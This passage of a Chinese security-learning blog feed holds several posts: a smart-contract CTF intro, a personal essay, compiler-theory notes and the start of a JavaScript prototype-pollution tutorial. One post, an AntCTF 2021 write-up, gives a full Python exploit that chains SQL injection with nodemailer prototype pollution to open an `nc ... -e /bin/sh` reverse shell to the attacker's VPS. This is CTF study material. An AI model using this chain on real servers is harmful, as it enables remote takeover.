start="3"><li><strong>和智能合约进行交互</strong>。</li></ol><p>在与合约进行交互之前，我们需要先知道合约的具体地址。</p><p>合约地址可以在 Ropsten 的 Transaction Details 中看到，也可以在 Remix 编辑器的左侧找到，根据合约的地址我们才能与合约进行交互。</p><p>在合约中如果有运算操作（加减、逻辑操作），就需要使用 ETH 来支付相关的运算费用（给矿工），例如 <code>balances[tx.origin]++;</code>。如果只是查询就不需要费用，例如 <code>return balances[tx.origin];</code>。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316121027.png"><br>（图片说明：这是我创建的合约在 Ropsten 网络上的记录，创建和 AddBalance 都花费了 ETH，但是查询操作没有花费 ETH）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316123031.png"><br>（图片说明：调用 CaptureTheFlag 函数后，emit 方法会把参数使用 log 的方式返回）</p><hr><h1 id="2-安全"><a href="#2-安全" class="headerlink" title="2 安全"></a>2 安全</h1><h2 id="2-1-智能合约安全"><a href="#2-1-智能合约安全" class="headerlink" title="2.1 智能合约安全"></a>2.1 智能合约安全</h2><p><font color="red">0x01 “漏洞挖掘思路”的含义是什么？</font></p><p>需要先了解这些词汇的含义：</p><ol><li>漏洞：事情有破绽，不周密的地方。在网络安全领域通常是指系统或程序有破绽的代码，不周密。（这里是名词）</li><li>挖掘：探求，寻找。</li><li>思路：思考的条理、线索。</li></ol><p>“漏洞挖掘”换句话就是，找出系统或者程序破绽的代码的思考线索。这里其实有两种不同类型的思考线索。 </p><ul><li>自动化：适用于任何漏洞。<ul><li>补丁对比</li></ul></li></ul><p>黑盒测试：</p><ul><li>Fuzz</li></ul><p>白盒测试：</p><ul><li>动态分析</li><li>静态分析<ul><li>过程间分析</li><li>数据流分析</li><li>符号执行</li></ul></li></ul><hr><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316190003.png"></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316190313.png"></p><hr><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><ol><li>大话区块链【Blockchain】：<a href="https://www.cnblogs.com/sunsky303/p/11778553.html">https://www.cnblogs.com/sunsky303/p/11778553.html</a></li><li>区块链入门教程-阮一峰的网络日志：<a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html</a></li><li>比特币入门教程-阮一峰的网络日志：<a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html">http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html</a></li><li>智能合约攻击面及ctf出题指南：<a href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/">https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</a></li><li>[论文阅读笔记]智能合约安全漏洞挖掘技术研究：<a href="https://zhuanlan.zhihu.com/p/144382236">https://zhuanlan.zhihu.com/p/144382236</a></li><li>CTF中智能合约部署交互基础：<a href="https://blog.csdn.net/qq_41429081/article/details/104321258">https://blog.csdn.net/qq_41429081/article/details/104321258</a></li><li>实现CTF智能合约题目的环境部署:<a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">https://www.cnblogs.com/KRDecad3/p/10798383.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【个人感悟】走近王垠</title>
      <link href="3b8002e7a287/"/>
      <url>3b8002e7a287/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>今天的我，本来在学习学姐推荐的 <a href="https://www.bilibili.com/video/av91858985/">南京大学《软件分析》</a> 的课程，这个课程是关于程序的静态分析的。</p><p>静态分析只是 PL（program language） 当中一个比较小的领域，但对于后期的代码审计应该会有很大的帮助。我在课间的时候就去搜了一下相关的内容，而知乎上最热的搜索是 【如何评价王垠新文章《我为什么不再做PL人》? - 知乎】。</p><p>从一些比较表象的评论中，我得到了一些关于这个人的标签：</p><ul><li>天才程序员。</li><li>保研清华。</li><li>三次博士退学。</li><li>在 Google 开发代码分析工具，沿用至今。</li><li>Python 静态分析工具作者。</li><li>各种吐槽文章。</li></ul><p>我开始思考：是不是这个人心理有问题？但是随着我越来越深入的了解，我打消了这种思考。</p><h1 id="1-正文"><a href="#1-正文" class="headerlink" title="1 正文"></a>1 正文</h1><p><font color="red">0x01 我为什么停止批判？</font></p><ol><li><p>当我读到下面这个评论</p><blockquote><p>王垠的才能和品德都超过我，我是没有资格。</p></blockquote></li><li><p>他是我的前辈，我现在学到的某些理论和方法可能就来自他。或者我需要从他过去的项目中学到其他的东西。</p></li><li><p>无脑的批判没有任何价值。</p></li></ol><p><font color="red">0x02 我在他的博客或其他人的评论中看到了什么？</font></p><p><strong>在评论中，批判的声音还是比较多。</strong>（大概率是通过各种信息了解的，而不是真是接触到真人）</p><blockquote><ul><li>从他退学的经历和退出 Google 的经历总结出：眼高手低。</li><li>从他开培训班总结出：割韭菜。</li><li>一把好牌打的稀烂</li><li>自以为是</li></ul></blockquote><p><strong>在评论中，也有一些赞许的声音。</strong></p><blockquote><ul><li>极客</li><li>独立思考</li></ul></blockquote><p>从我的角度看的话，他有强迫症+完美主义，他在追求他认为美的事物，他的行动也在证明这一切。知乎其中一个评论所说：</p><blockquote><p>蔑视所有技术权威和IT暴发户，追求自由和兴趣的特立独行。</p></blockquote><p>他对于完美的追求大于对于名利的追求，所以才能做出如此高的成就，所以才能做出让「普通人」无法理解的行动。</p><p>他的追求不是一般人能做到的，能坚持的。他在贯彻着赫尔曼·黑塞的那句话。</p><blockquote><p>每个人的生活都是一条通向自身的道路。每个人的真正职责只有一个：找到自我。然后在心中坚守一生，全心全意，永不停息。所有其它的路都是不完整的，是人的逃避方式，是对社会角色的懦弱伪装，是随波逐流，是对内心的恐惧。——赫尔曼·黑塞</p></blockquote><hr><h1 id="2-学习"><a href="#2-学习" class="headerlink" title="2 学习"></a>2 学习</h1><h2 id="2-1-《对智商的怀疑》"><a href="#2-1-《对智商的怀疑》" class="headerlink" title="2.1 《对智商的怀疑》"></a>2.1 《对智商的怀疑》</h2><p>值得学习的地方：</p><ul><li><strong>独立思考</strong>以及会思考（这应该是最为重要和关键的）。</li><li>有自己的<strong>追求</strong>。（找到自我）</li><li><strong>坚持</strong>自己的追求。（坚守自我）</li><li><strong>Better。</strong></li></ul><p>需要避免的地方：</p><ul><li><strong>接受现实，懂得理解他人，学会与人合作</strong>。需要清楚的知道这世界是不完美的，有比自己更强的人，也有比自己更弱的人，我需要在自己的领域做得更好，接纳别人的缺点和自己的缺点。</li></ul><p>这上面都只是指出学习的大体方向，并没有指出具体的内容，每个点都需要很长时间的努力和挣扎，还需要以后耐心的研读大佬的巨作来理解其内涵和思想。</p>]]></content>
      
      
      <categories>
          
          <category> 个人感悟 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【CTF系列】2021年3月-AntCTF Web WP - Exploit</title>
      <link href="4c08a869bcad/"/>
      <url>4c08a869bcad/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-8-bit-pub"><a href="#1-8-bit-pub" class="headerlink" title="1 8-bit-pub"></a>1 8-bit-pub</h2><ol><li>使用 <code>docker-compose up --build</code> 启动环境。<a href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">题目传送门</a></li><li>修改 exp 相关配置，运行 exp。</li><li>在<strong>服务器</strong>监听 9999 端口，即使用命令 <code>nc -lvnp 9999</code>。执行 readflag。<blockquote><p>备注：该题共 3 种做法，其他做法的 exp 请查看 Github 项目 <a href="https://github.com/slug01sh/ctf-writeups/tree/master/2021/2021-antctf">ctf-writeups</a>)</p></blockquote></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">version 1:</span></span><br><span class="line"><span class="string">1. 污染nodemail库</span></span><br><span class="line"><span class="string">2. 使用nc反弹shell</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VPS_HOST = os.environ.get(<span class="string">&quot;VPS_HOST&quot;</span>)  <span class="comment"># 从环境变量读取VPS的IP</span></span><br><span class="line">VPS_PORT = <span class="number">9999</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:3000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vps_init</span>():</span></span><br><span class="line">    print(<span class="string">f&quot;vps host:<span class="subst">&#123;VPS_HOST&#125;</span>&quot;</span>)</span><br><span class="line">    flag = input(<span class="string">&quot;run &#x27;nc -lvnp 9999&#x27; in your vps! yes or no(y/n)?&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="string">&#x27;y&#x27;</span> <span class="keyword">or</span> flag.lower == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;exit!&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_headers</span>() -&gt; dict:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json2string</span>(<span class="params">data</span>) -&gt; str:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    json转字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param data: 需要发送的json数据</span></span><br><span class="line"><span class="string">    :return: json的字符串格式</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pretty_print_POST</span>(<span class="params">req</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    打印 Request 对象</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param req: Request对象</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;&#123;&#125;\n&#123;&#125;\r\n&#123;&#125;\r\n\r\n&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        <span class="string">&#x27;-----------START-----------&#x27;</span>,</span><br><span class="line">        req.method + <span class="string">&#x27; &#x27;</span> + req.url,</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span>.join(<span class="string">&#x27;&#123;&#125;: &#123;&#125;&#x27;</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> req.headers.items()),</span><br><span class="line">        req.body,</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_inject</span>():</span></span><br><span class="line">    login_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/user/signin&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="comment"># 服务器执行的SQL语句：SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = `password` = true</span></span><br><span class="line">    data = json2string(data=data)</span><br><span class="line">    response = session.post(login_url, data=data, headers=headers)</span><br><span class="line">    print(response.text)  <span class="comment"># &#123;&quot;message&quot;:&quot;Signin success.&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollute</span>():</span></span><br><span class="line">    sendmail_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/admin/email&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: <span class="string">&quot;slug01sh@gmail.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subject&quot;</span>: <span class="number">123</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: <span class="number">456</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.sendmail&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.args&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">            <span class="string">f&quot;nc <span class="subst">&#123;VPS_HOST&#125;</span> <span class="subst">&#123;VPS_PORT&#125;</span> -e /bin/sh&quot;</span></span><br><span class="line">            <span class="comment"># 如果在 mac 上搭建测试环境，而不是 docker，不能使用 nc，而是使用 ncat。</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;constructor.prototype.path&quot;</span>: <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = json2string(data=data)</span><br><span class="line">    response = session.post(sendmail_url, data=data, headers=headers)</span><br><span class="line">    print(response.text)  <span class="comment"># &#123;&quot;message&quot;:&quot;Signin success.&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 检查基本配置</span></span><br><span class="line">    vps_init()</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    headers = get_headers()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. SQL注入登陆admin：多读文档，自动类型转换很可能有意想不到的后果。</span></span><br><span class="line">    sql_inject()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. nodejs原型链污染：漏洞修复过!=修好了，有可能黑名单没有过滤完全。</span></span><br><span class="line">    pollute()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 在服务器使用nc监听9999端口，getshell</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 原型链污染 </tag>
            
            <tag> 任意文件读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机基础】编译原理总结</title>
      <link href="fdf6e02b1ae5/"/>
      <url>fdf6e02b1ae5/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><h1 id="1-开篇词"><a href="#1-开篇词" class="headerlink" title="1 开篇词"></a>1 开篇词</h1><p><font color="red">0x01 为什么要学习编译原理？</font></p><p>编程语言是所有程序的基础。而语言的核心就在于「编译原理」。我曾经记得某位大佬说过，漏洞的本质就是利用「特殊手段」可以控制程序的运行结果。</p><blockquote><p>如果不了解整个程序运行的机制，怎么能对其进行控制呢？</p></blockquote><p>对于代码审计的深层技术，肯定是向着细粒度更小的方向发展，也就是根据语义和语法上进行分析，而非单纯靠阅读代码后凭直觉的判断。</p><hr><h1 id="2-脚本语言"><a href="#2-脚本语言" class="headerlink" title="2 脚本语言"></a>2 脚本语言</h1><h2 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h2><p><font color="red">0x02 什么是编译原理的「前端」和「后端」</font></p><p>有点类似 Web 中的前后端。Web 的前端并不指代操作系统和浏览器，Web 后端通常都是运行在服务器中。</p><p>这里的“前端”是指与执行代码的机器无关的部分，即词法分析、语法分析、语义分析等。</p><p>这里的“后端”是指与执行代码的机器有关的部分，即生成中间代码、优化、生成目标代码。</p><hr><p><font color="red">0x03 什么是词法分析？</font></p><p>我们都知道编程语言也是一种语言，可以用学习英语的单词来类比。</p><p>尝试一下阅读下面的句子：</p><blockquote><p>we are family.</p></blockquote><p>我们会将这个句子先分成三个单词 we，are，family。我们是怎么划分的呢？通过空格和标点符号。编程语言也需要做类似的分析，但是划分方式会稍微复杂一点。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>编程语言会按照规则将 <code>let</code>，<code>a</code>，<code>=</code>，<code>1</code> 分开，也就是我们常说的「分词」。</p><hr><p><font color="red">0x04 什么是语法分析？</font></p><p>这里的语法，和我们学习英语的语法也是类似的。我们在生活中使用语法可能不太多，但是当遇到复杂的句子或者很长的句子，就肯定需要使用到语法。</p><p>我们使用语法分析句子的大概步骤：划分句子成分。</p><p>对于编程语言也是类似的，他需要将「词法分析」获得的「词」进行成分划分，并且记录下来（人类会自动记录，所以通常不需要思考如何记录）。记录语法分析结果的结构就叫做<strong>抽象语法树</strong>。</p><blockquote><p>为什么是树呢？</p><ul><li>待续……</li></ul></blockquote><p>语法分析其实就是构建抽象语法树的过程（语法解析、文件解析），有一些现成的工具可以进行利用。</p><hr><p><font color="red">0x05 常见的语法分析工具有哪些？是怎么实现的？</font></p><p>工具列表：<a href="https://blog.csdn.net/gongwx/article/details/99645305">传送门</a></p><ul><li> Yacc（或 GNU 的版本，Bison）</li><li> Antlr</li><li> JavaCC </li></ul><p>实现方法：</p><ul><li>自顶向下</li><li>自底向上</li></ul><hr><p><font color="red">0x06 什么是语法分析？</font></p><p>语法分析就是理解抽象语法树（机器上的理解）。有几个比较关键点：</p><ul><li>做什么操作？赋值、加法、减法、调用函数</li><li>变量是哪个？局部变量还是全局变量？需要结合代码的上下文分析。</li><li>细节处理：代码位于xx行？是否类型转换。</li></ul><p>完善抽象语法树的过程，比较复杂。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】JavaScript原型链污染攻击总结</title>
      <link href="a53ac9b162e0/"/>
      <url>a53ac9b162e0/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>原型链污染，是 NodeJs 中常见的漏洞，在做 antCTF 时也遇到的原型链污染题目，在此记录自己学习原型链污染的过程。</p><h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h1><p><font color="red">0x01 问：原型链有什么作用？</font></p><p>用来做继承，也就是基于原有的代码做一定的修改。下面是一个使用原型链实现继承的案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&#x27;kevin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> Child();</span><br><span class="line"><span class="built_in">console</span>.log(child1.getName()) <span class="comment">// kevin</span></span><br></pre></td></tr></table></figure><p>当「方法」的 prototype 指定对象原型之后，当试图访问该类的对象属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。下面是一个修改 prototype 的案例：</p><blockquote><p>注意：prototype 是「方法特有的」（需要大概了解，后面需要使用到）</p><ul><li>方法：类似 C++ 中的类。除了有属性 <code>__proto__</code>, 还有属性 prototype，prototype 指向该方法的原型对象。propotype 指定其他对象之后，会包含所有原型对象的属性和方法</li><li>对象：类似 C++ 中的对象。对象只有属性 <code>__proto__</code> 指向该对象的构造函数的原型对象。对象有 <code>constructor</code> 里面包含该类的 prototype。</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让我们从一个函数里创建一个对象o，它自身拥有属性a和b的：</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这么写也一样</span></span><br><span class="line"><span class="comment">function f() &#123;</span></span><br><span class="line"><span class="comment">  this.a = 1;</span></span><br><span class="line"><span class="comment">  this.b = 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f(); <span class="comment">// &#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在f函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不要在 f 函数的原型上直接定义 f.prototype = &#123;b:3,c:4&#125;;这样会直接打破原型链</span></span><br><span class="line"><span class="comment">// o.[[Prototype]] 有属性 b 和 c</span></span><br><span class="line"><span class="comment">//  (其实就是 o.__proto__ 或者 o.constructor.prototype)</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 是 Object.prototype.</span></span><br><span class="line"><span class="comment">// 最后o.[[Prototype]].[[Prototype]].[[Prototype]]是null</span></span><br><span class="line"><span class="comment">// 这就是原型链的末尾，即 null，</span></span><br><span class="line"><span class="comment">// 根据定义，null 就是没有 [[Prototype]]。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 综上，整个原型链如下:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// a是o的自身属性吗？是的，该属性的值为 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.b); <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// b是o的自身属性吗？是的，该属性的值为 2</span></span><br><span class="line"><span class="comment">// 原型上也有一个&#x27;b&#x27;属性，但是它不会被访问到。</span></span><br><span class="line"><span class="comment">// 这种情况被称为&quot;属性遮蔽 (property shadowing)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.c); <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// c是o的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// c是o.[[Prototype]]的属性吗？是的，该属性的值为 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.d); <span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// d 是 o 的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// d 是 o.[[Prototype]] 的属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 为 null，停止搜索</span></span><br><span class="line"><span class="comment">// 找不到 d 属性，返回 undefined</span></span><br></pre></td></tr></table></figure><p><font color="red">0x02 问：<code>__proto__</code> 属性有什么作用？</font></p><p>每个「对象」都有 <code>__proto__</code> 属性，指向了创建该对象的构造函数的原型。其实这个属性指向了 [[prototype]]，但是 [[prototype]] 是内部属性，我们并不能访问到，所以使用 <code>__proto__</code> 来访问。</p><blockquote><p>简而言之：用 prototype 无法直接访问，需要使用 <code>__proto__</code> 访问。prototype 是一个指针属性。</p></blockquote><p>这里有个需要区分的概念：</p><ul><li><code>__proto__</code>：指向原型对象的构造器。</li><li><code>constructor</code>：指向当前对象的构造器。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210311120136.png"><br>（图片说明：右下角是图片的说明，左图的<code>__proto__</code>的箭头指向原型对象的构造器）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210311120456.png"><br>（图片说明：右下角是图片的说明，左图的<code>constructor</code>的箭头指向原型对象的构造器）</p><hr><p><font color="red">0x03 